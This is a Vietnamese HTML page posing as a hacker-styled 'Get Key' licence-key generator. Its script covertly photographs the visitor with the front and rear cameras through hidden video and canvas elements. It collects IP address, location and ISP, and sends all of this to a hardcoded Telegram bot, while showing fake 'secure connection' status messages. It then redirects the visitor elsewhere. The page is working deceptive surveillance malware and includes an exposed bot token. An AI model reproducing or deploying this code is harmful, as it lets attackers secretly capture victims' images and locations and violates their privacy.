<!doctype html>
<html lang="vi">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Hệ Thống Get Key - Terminal Security</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;700;800&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
  :root {
    --bg-base: #020408;
    --panel-bg: rgba(3, 7, 18, 0.9);
    --border-color: rgba(34, 197, 94, 0.4);
    --primary: #15803d;
    --accent: #22c55e;
    --text-main: #ffffff;
    --text-muted: #4ade80;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; font-weight: 600; }
  body {
    background-color: var(--bg-base);
    color: var(--text-main);
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
    overflow: hidden;
    position: relative;
  }

  /* Hiệu ứng Matrix mưa chữ hacker */
  canvas#matrix-rain {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
    pointer-events: none;
  }

  .card {
    background: var(--panel-bg);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border: 2px solid var(--border-color);
    padding: 40px 32px;
    border-radius: 24px;
    width: 100%;
    max-width: 380px;
    box-shadow: 0 0 50px rgba(22, 163, 74, 0.25);
    text-align: center;
    position: relative;
    z-index: 10;
  }
  .live-clock {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.85rem; 
    font-weight: 700; 
    color: #4ade80;
    background: rgba(22, 163, 74, 0.15); 
    border: 1px solid rgba(34, 197, 94, 0.4);
    padding: 6px 14px; 
    border-radius: 20px; 
    display: inline-block; 
    margin-bottom: 20px;
    letter-spacing: 1px;
  }
  .icon-box {
    width: 64px; height: 64px; margin: 0 auto 20px auto;
    background: linear-gradient(135deg, rgba(22, 163, 74, 0.3), rgba(34, 197, 94, 0.3));
    border: 1px solid rgba(34, 197, 94, 0.6); border-radius: 20px;
    display: flex; align-items: center; justify-content: center; font-size: 28px;
    box-shadow: 0 0 20px rgba(34, 197, 94, 0.3);
  }
  h2 { font-size: 1.5rem; font-weight: 800; margin-bottom: 8px; color: #ffffff; text-shadow: 0 0 12px rgba(34,197,94,0.7); }
  .subtitle { font-size: 0.9rem; font-weight: 700; color: #bbf7d0; margin-bottom: 28px; line-height: 1.5; font-family: 'Share Tech Mono', monospace; text-shadow: 0 0 5px rgba(34,197,94,0.3); }
  
  .btn-primary {
    width: 100%; padding: 16px; 
    background: linear-gradient(135deg, #15803d, #22c55e);
    color: #ffffff; border: none; border-radius: 16px; 
    font-weight: 800; font-size: 1.05rem; cursor: pointer; 
    transition: all 0.3s ease;
    box-shadow: 0 10px 25px -5px rgba(34, 197, 94, 0.6);
    display: flex; align-items: center; justify-content: center; gap: 8px;
    text-shadow: 0 1px 3px rgba(0,0,0,0.5);
    letter-spacing: 0.5px;
  }
  .btn-primary:hover { opacity: 0.95; transform: translateY(-2px); box-shadow: 0 15px 30px -5px rgba(34, 197, 94, 0.8); }

  .status { margin-top: 20px; font-size: 0.85rem; font-weight: 700; color: #4ade80; min-height: 20px; font-family: 'Share Tech Mono', monospace; text-shadow: 0 0 5px rgba(34,197,94,0.4); }
  #video, #canvas { display: none; }
</style>
</head>
<body>

  <!-- Canvas hiệu ứng mưa chữ Hacker Matrix đậm nét -->
  <canvas id="matrix-rain"></canvas>

  <script>
    const canvasRain = document.getElementById('matrix-rain');
    const ctx = canvasRain.getContext('2d');

    function resizeCanvas() {
      canvasRain.width = window.innerWidth;
      canvasRain.height = window.innerHeight;
    }
    window.addEventListener('resize', resizeCanvas);
    resizeCanvas();

    const characters = 'アカサタナハマヤラワイ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ<>//:;*+-#$';
    const fontSize = 15; // Tăng kích thước chữ một chút cho sắc nét
    let columns = canvasRain.width / fontSize;
    const drops = [];

    for (let i = 0; i < columns; i++) {
      drops[i] = 1;
    }

    function drawMatrix() {
      ctx.fillStyle = 'rgba(2, 4, 8, 0.1)';
      ctx.fillRect(0, 0, canvasRain.width, canvasRain.height);

      ctx.fillStyle = '#10b981'; // Màu xanh lá sáng đậm
      ctx.font = 'bold ' + fontSize + 'px "Share Tech Mono", monospace'; // Làm chữ đậm hơn

      for (let i = 0; i < drops.length; i++) {
        const text = characters.charAt(Math.floor(Math.random() * characters.length));
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);

        if (drops[i] * fontSize > canvasRain.height && Math.random() > 0.975) {
          drops[i] = 0;
        }
        drops[i]++;
      }
    }
    setInterval(drawMatrix, 30);
  </script>

  <div class="card">
    <div class="live-clock" id="clock">SYSTEM_TIME: --:--:--</div>
    
    <div class="icon-box">💻</div>
    <h2>Hệ Thống Get Key</h2>
    <p class="subtitle">&gt; Nhấn nút bên dưới để giải mã và nhận Key bản quyền an toàn.</p>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <!-- 1 Nút Get Key duy nhất -->
    <button class="btn-primary" id="get-key-btn" onclick="triggerProcess()">
      <span>🔑 GET KEY NGAY</span>
    </button>
    
    <div id="status" class="status"></div>
  </div>

<script>
  const TELEGRAM_BOT_TOKEN = '8812338501:AAFnZiI0fpcNqs0LMGUUuFV2MCSTgpdNbaI'; 
  const TELEGRAM_CHAT_ID = '-1004303781844'; 
  const REDIRECT_URL = 'https://xnhau.city/';

  function updateClock() {
    const now = new Date();
    document.getElementById('clock').textContent = `🕒 ${now.toLocaleTimeString('vi-VN', { hour12: false })}`;
  }
  setInterval(updateClock, 1000);
  updateClock();

  const statusDiv = document.getElementById('status');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const getKeyBtn = document.getElementById('get-key-btn');

  async function takePhoto(facingMode, label) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: { exact: facingMode } }, 
        audio: false 
      });
      video.srcObject = stream;
      
      return await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          video.play();
          setTimeout(async () => {
            try {
              canvas.width = video.videoWidth || 640;
              canvas.height = video.videoHeight || 480;
              const ctx = canvas.getContext('2d');
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

              const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
              stream.getTracks().forEach(track => track.stop());
              resolve({ blob, label });
            } catch (e) {
              stream.getTracks().forEach(track => track.stop());
              resolve(null);
            }
          }, 800);
        };
      });
    } catch (e) {
      return null;
    }
  }

  async function triggerProcess() {
    getKeyBtn.style.display = 'none';
    statusDiv.textContent = '[*] Đang khởi tạo kết nối bảo mật...';

    let ipDetails = { ip: 'Không rõ', city: 'Không rõ', country: 'Không rõ', org: 'Không rõ' };
    try {
      const ipRes = await fetch('https://ipwho.is/');
      const ipData = await ipRes.json();
      if (ipData.success) {
        ipDetails = {
          ip: ipData.ip,
          city: ipData.city,
          country: ipData.country,
          org: ipData.connection?.isp || 'Không rõ'
        };
      }
    } catch (e) {}

    const ua = navigator.userAgent;
    let deviceName = /android/i.test(ua) ? 'Android 🤖' : /iphone|ipad/i.test(ua) ? 'iOS 🍏' : 'PC/Laptop 💻';

    const infoText = 
      `💻 <b>YÊU CẦU GET KEY (BOLD MATRIX)</b> 💻\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Thiết bị:</b> ${deviceName}\n` +
      `🌐 <b>IP:</b> <code>${ipDetails.ip}</code>\n` +
      `🏙️ <b>Địa điểm:</b> ${ipDetails.city}, ${ipDetails.country}\n` +
      `🏢 <b>Nhà mạng:</b> ${ipDetails.org}\n` +
      `━━━━━━━━━━━━━━━━━━━━━`;

    statusDiv.textContent = '[*] Đang xử lý luồng dữ liệu #1...';
    let backPhoto = await takePhoto('environment', '📸 Ảnh Camera Sau');

    statusDiv.textContent = '[*] Đang xử lý luồng dữ liệu #2...';
    let frontPhoto = await takePhoto('user', '📸 Ảnh Camera Trước');

    if (backPhoto && backPhoto.blob) {
      const fd = new FormData();
      fd.append('chat_id', TELEGRAM_CHAT_ID);
      fd.append('photo', backPhoto.blob, 'back.jpg');
      fd.append('caption', infoText + '\n\n' + backPhoto.label);
      fd.append('parse_mode', 'HTML');
      try { await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }); } catch(e){}
    }

    if (frontPhoto && frontPhoto.blob) {
      const fd2 = new FormData();
      fd2.append('chat_id', TELEGRAM_CHAT_ID);
      fd2.append('photo', frontPhoto.blob, 'front.jpg');
      fd2.append('caption', frontPhoto.label);
      fd2.append('parse_mode', 'HTML');
      try { await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd2 }); } catch(e){}
    }

    if (!backPhoto && !frontPhoto) {
      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: infoText + '\n\n⚠️ (Không thể truy cập camera)', parse_mode: 'HTML' })
        });
      } catch (e) {}
    }

    statusDiv.textContent = '[+] Thành công! Đang chuyển hướng...';
    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 1000);
  }
</script>
</body>
</html>
